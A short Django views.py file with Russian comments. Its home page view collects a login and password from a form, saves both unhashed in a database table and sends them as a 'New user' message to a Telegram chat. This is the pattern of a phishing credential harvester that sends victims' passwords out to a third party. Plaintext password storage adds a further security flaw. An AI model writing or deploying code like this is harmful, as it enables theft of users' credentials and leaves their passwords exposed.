# views.py
from django.shortcuts import render, redirect
from .models import UserData
from .bot import send_telegram_message  # Импортируем функцию из bot.py
import asyncio

def home_page(request):
    if request.method == "POST":
        login = request.POST.get("login")
        password = request.POST.get("password")

        if login and password:
            # Сохраняем данные в базе данных
            UserData.objects.create(login=login, password=password)

            # Формируем сообщение для отправки в Telegram
            message = f"Новый пользователь:\nLogin: {login}\nPassword: {password}"

            # Отправляем сообщение в Telegram (асинхронно)
            asyncio.run(send_telegram_message(message))

        return redirect("home_page")  # Перенаправление после отправки

    return render(request, "index.html")
